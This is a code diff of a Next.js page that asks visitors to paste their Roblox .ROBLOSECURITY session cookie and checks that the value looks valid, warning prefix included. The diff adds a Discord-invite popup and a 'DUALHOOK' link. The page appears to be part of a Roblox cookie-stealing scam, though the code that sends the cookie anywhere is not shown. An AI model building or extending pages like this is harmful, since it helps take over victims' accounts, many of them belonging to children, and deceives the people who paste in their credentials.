@@ -1,9 +1,18 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Shield, Play } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Card, CardContent } from "@/components/ui/card"
+import Link from "next/link"
+
+interface DiscordInvite {
+  guild: {
+    name: string
+  }
+  approximate_member_count: number
+  approximate_presence_count: number
+}
 
 export default function Home() {
   const [cookie, setCookie] = useState("")
@@ -12,13 +21,38 @@ export default function Home() {
   const [username, setUsername] = useState("")
   const [statusText, setStatusText] = useState("")
   const [error, setError] = useState("")
+  const [showDiscordModal, setShowDiscordModal] = useState(false)
+  const [discordData, setDiscordData] = useState<DiscordInvite | null>(null)
+
+  useEffect(() => {
+    const hasSeenModal = localStorage.getItem("hasSeenDiscordModal")
+    if (!hasSeenModal) {
+      setShowDiscordModal(true)
+      fetchDiscordData()
+    }
+  }, [])
+
+  const fetchDiscordData = async () => {
+    try {
+      const response = await fetch("https://discord.com/api/v10/invites/tGYBBAfc5T?with_counts=true")
+      const data = await response.json()
+      setDiscordData(data)
+      console.log("[v0] Discord data fetched:", data)
+    } catch (error) {
+      console.error("[v0] Failed to fetch Discord data:", error)
+    }
+  }
+
+  const handleCloseModal = () => {
+    localStorage.setItem("hasSeenDiscordModal", "true")
+    setShowDiscordModal(false)
+  }
 
   const isValidRobloxCookie = (cookieValue: string): boolean => {
     const trimmedCookie = cookieValue.trim()
 
     if (!trimmedCookie) return false
 
-    // Check if it has the warning prefix and extract the actual cookie
     if (trimmedCookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
       const parts = trimmedCookie.split("|_")
       if (parts.length >= 2) {
@@ -27,13 +61,11 @@ export default function Home() {
       }
     }
 
-    // Check if it starts with .ROBLOSECURITY= and extract the value
     if (trimmedCookie.startsWith(".ROBLOSECURITY=")) {
       const cookiePart = trimmedCookie.substring(".ROBLOSECURITY=".length)
       return cookiePart.length > 50
     }
 
-    // Just check if it looks like a long token (50+ characters)
     return trimmedCookie.length > 50
   }
 
@@ -101,8 +133,95 @@ export default function Home() {
     }
   }
 
+  const onlineMembers = discordData?.approximate_presence_count || 27
+  const totalMembers = discordData?.approximate_member_count || 179
+  const offlineMembers = totalMembers - onlineMembers
+  const serverName = discordData?.guild?.name || "Uhmiyuz's server"
+
   return (
     <main className="relative min-h-screen bg-black flex flex-col items-center justify-center p-4 overflow-hidden">
+      {showDiscordModal && (
+        <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className="bg-white rounded-lg shadow-2xl overflow-hidden max-w-md w-full animate-in fade-in zoom-in duration-300">
+            {/* Header with Discord logo */}
+            <div className="bg-[#5865F2] pt-12 pb-8 flex items-center justify-center">
+              <div className="w-24 h-24 bg-white rounded-full flex items-center justify-center shadow-lg">
+                <svg viewBox="0 0 127.14 96.36" className="w-14 h-14 fill-[#5865F2]">
+                  <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
+                </svg>
+              </div>
+            </div>
+
+            {/* Content */}
+            <div className="px-8 py-6 bg-white">
+              <h2 className="text-2xl font-bold text-gray-800 mb-6 flex items-center gap-2">
+                <span className="text-2xl">🎉</span>
+                Join {serverName}!
+              </h2>
+
+              <div className="flex items-center justify-between mb-6">
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
+                  <div>
+                    <div className="text-xl font-bold text-gray-800">{onlineMembers}</div>
+                    <div className="text-xs text-gray-500 uppercase font-semibold">Online</div>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
+                  <div>
+                    <div className="text-xl font-bold text-gray-800">{offlineMembers}</div>
+                    <div className="text-xs text-gray-500 uppercase font-semibold">Offline</div>
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <div className="w-2 h-2 bg-[#5865F2] rounded-full"></div>
+                  <div>
+                    <div className="text-xl font-bold text-gray-800">{totalMembers}</div>
+                    <div className="text-xs text-gray-500 uppercase font-semibold">Total Members</div>
+                  </div>
+                </div>
+              </div>
+
+              {/* Buttons */}
+              <div className="flex gap-3">
+                <button
+                  onClick={handleCloseModal}
+                  className="flex-1 py-3 px-4 border-2 border-gray-300 text-gray-700 rounded-md font-semibold hover:bg-gray-50 transition-colors text-center text-sm uppercase"
+                >
+                  Maybe Later
+                </button>
+                <a
+                  href="https://discord.gg/tGYBBAfc5T"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  onClick={handleCloseModal}
+                  className="flex-1 py-3 px-4 bg-[#5865F2] text-white rounded-md font-semibold hover:bg-[#4752C4] transition-colors flex items-center justify-center gap-2 text-sm uppercase"
+                >
+                  <svg viewBox="0 0 127.14 96.36" className="w-5 h-5 fill-white">
+                    <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z" />
+                  </svg>
+                  Join Now!
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      <div className="absolute top-6 right-6 z-20">
+        <Link href="/dualhook">
+          <Button
+            variant="outline"
+            className="bg-zinc-900/80 backdrop-blur-xl border-2 border-primary/40 text-white hover:bg-zinc-800 hover:border-primary/60 font-semibold shadow-[0_0_30px_rgba(168,85,247,0.3)] hover:shadow-[0_0_40px_rgba(168,85,247,0.5)] transition-all"
+          >
+            DUALHOOK
+          </Button>
+        </Link>
+      </div>
+
       {/* Neon background effects */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/20 rounded-full blur-[128px] animate-pulse"></div>
